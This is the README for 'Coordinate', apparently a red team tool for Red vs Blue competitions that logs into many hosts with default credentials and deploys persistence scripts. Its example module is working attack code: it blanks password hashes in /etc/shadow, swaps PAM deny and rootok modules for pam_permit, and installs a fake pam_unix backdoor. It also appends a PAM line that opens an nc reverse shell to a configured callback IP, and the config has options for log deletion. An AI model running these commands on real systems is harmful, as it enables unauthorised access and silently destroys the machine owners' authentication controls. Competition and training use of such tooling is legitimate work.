# Coordinate

Red team automation tool that runs many scripts in parallel on many remote boxes, assuming that you know the default creds. This is useful for deploying persistence mechanisms at minute zero in Red vs Blue competitions.

# Configuration

There are two parts to Coordinate-- the first is the config (`coordinate.toml`), which specifies targets, default creds, and modules to employ. 

The second part is the modules, which contain the scripts and logic to run through Coordinate.

Here is an configuration example for `coordinate.toml`:

```toml
NoTTY = false
ConnectionsPerBox = 1 # default to 3
# One callback IP/hostname  be randomly chosen every time we drop one
CallBackIps = ["192.168.1.12","hackerbox"] 

[[target]]

# Which IPs/hostnames and which modules to run on them
Ips = ["192.168.140.138","172.17.156.129"]
Modules = ["STARFOX",]

# Optional, will enable log deletion/cleanup/avoidance of noisy techs
Stealthy = true 

# Optional, will enable troll/annoying actions
Annoying = true 

# "Difficulty" level, default 0. Range 0-5 where lower is more difficult
Level = 3   

# Username and password combinations. Every permutation will be tried.
Username = ["root", "bob"] # User must be root or sudoer
Password = ["Password1!", "Password2@"]

[[target]]
Ips = ["10.20.X.11","10.20.X10.13"]
ReplaceX = "3-5" # if you have an X in the above, iterate through range here
Modules = ["ireul",]
Username = ["root", "vpxuser", "dcui"]
Password = ["Password1!",]

[[module]]
Name = "STARFOX"
Debug = true

[[module]]
Name = "ireul"
Enabled = ["trojan_hostd",]
```

# Modules

For Coordinate to work, the modules must be structured in a certain way. First, the name of the module passed must be the same as a folder at the same level of Coordinate. For example, if my module was `STARFOX`, our file struture might be something like:

```bash
├── coordinate
│   ├── coordinate
│   ├── coordinate.go
│   ├── coordinate.toml
│   ├── go.mod
│   ├── go.sum
│   ├── LICENSE
│   ├── output.go
│   ├── README.md
│   └── ssher.go
├── ireul
│   ├── backdoor.sh
│   ├── fake-passwd.sh
│   ├── LICENSE
│   ├── README.md
│   └── vmware-hostd.sh
└── STARFOX
    ├── drops
    │   └── fake_pam.c
    ├── iptables.sh
    ├── pam.sh
    └── README.md
```

The second assumption is that any module scripts will end in `.sh`. That's it for structure. 

Onto module contents. The name of each module is the name of the file without `.sh`. For logic, there is no persistent state across files or across modules. Every file is interpreted at the same time it's executed. With that in mind, let's take a look at what `pam.sh` might look like:

```bash
# This is metadata about the file. DESC has no impact on the execution of the file, since it's not a keyword, and thus acts like any other comment.
#DESC wrecks pam lol

# Any line starting with an octothorpe (#) without being a directive
# is treated as a comment, like this line.

# LEVEL specifies how "difficult" this mechanism is to detect and counter, 
# so that a red teamer may be able to scale back the difficulty of the techs 
# they're deploying. Lower is more difficult, where 0 is incredibly tough 
# (e.g., well written rootkit) and 5 is trivial (e.g., added user).
# This defaults to 0 if it is not specified.
#LEVEL 2

# These are the commands actually executed. In this case, it is removing the 
# "passwords" for locked accounts, and permitting empty passwords in PAM's
# common-auth file for Debian-based systems.
sed -ie "s/*//g" /etc/shadow
sed -ie "s/\!//g" /etc/shadow
cp -f /bin/bash /bin/false
cp -f /bin/bash /usr/sbin/nologin

if [ -d "/etc/pam.d/common-auth" ]; then
    sed -ie "s/nullok_secure/nullok/g" /etc/pam.d/common-auth
fi

# Let's say that you have multiple ways to accomplish some task, e.g., 
# circumventing PAM authentication. Roulettes will allow you to randomly
# select one of these techniques to execute. Sinci the script is interpreted
# line by line, this directive must also include how many roulette options there
# are. Alternatively, you can use the #ROLL directive to have a 1-in-X chance
# of running some block, which is another type of roulette.
#STARTROULETTE 3
#ROULETTE

# These commands allow authentication and substituting users if it's to the
# root account.
sed -ie "s/pam_rootok.so/pam_permit.so/g" /etc/pam.d/common-auth
sed -ie "s/pam_rootok.so/pam_permit.so/g" /etc/pam.d/su

#ROULETTE

# Instead of denying unsuccessful PAM authentication attempts, permit them.
sed -ie "s/pam_deny.so/pam_permit.so/g" /etc/pam.d/common-auth

#ROULETTE

# Replace pam_deny.so with pam_permit.so for Debian-based systems
cp -f /lib/x86_64-linux-gnu/security/pam_permit.so \
    /lib/x86_64-linux-gnu/security/pam_deny.so

# This signifies the end of the roulette sections.
#ENDROULETTE

# With this ROLL, we will have a 1-in-3 chance to run that block.
#ROLL 3
# Let's say that you've written code for a fake PAM shared object that allows
# one master password, as a backdoor. You can drop files with the #DROP 
# directive. This assumes that your files are within $MODULE_PATH/drops.
#DROP fake_pam.so /tmp/systemd-cache

# Which you can then interact with using normal commands on the remote system.
gcc /tmp/systemd-cache -o /tmp/systemd-cache-compiled
cp -f /tmp/systemd-cache-compiled /lib/x86_64-linux-gnu/security/pam_unix.so

# This ends the #ROLL block.
#ENDROULETTE

# If you want to see the output of a command, you can tell Coordinate to wait
# for it with the #OUTPUT directive.
#OUTPUT cat /etc/os-release

# If you want to take some conditional action based on the output of a command,
# but you want it to affect meta-tags/directives, you can use IFCMD. This is
# slower than using native if/else/fi within the shell.
#IFCMD cat /etc/password | grep "bob"

# You can print to the terminal with "red" or negative messages, or "green" or
# positive messages.
#PRINT_RED Bob is still on their system!

# Again, unlike native execution control, these directives control whether or
# not Coordinate will process a directive. In this example, if the string 'bob'
# is found in /etc/passwd, Coordinate will print the red message above. 
# Otherwise, it will print the message below.
#ELSE

#PRINT_GREEN Bob has been removed! Good job blue team!

#ENDIF

# If you wanted to drop a callback/reverse shell script, you can use the text 
# '#CALLBACK_IP' and Coordinate will replace it with a configured callback IP.
echo "auth required pam_exec.so nc #CALLBACK_IP 4444 -e /bin/bash" >> \
    /etc/pam.d/common-auth
```
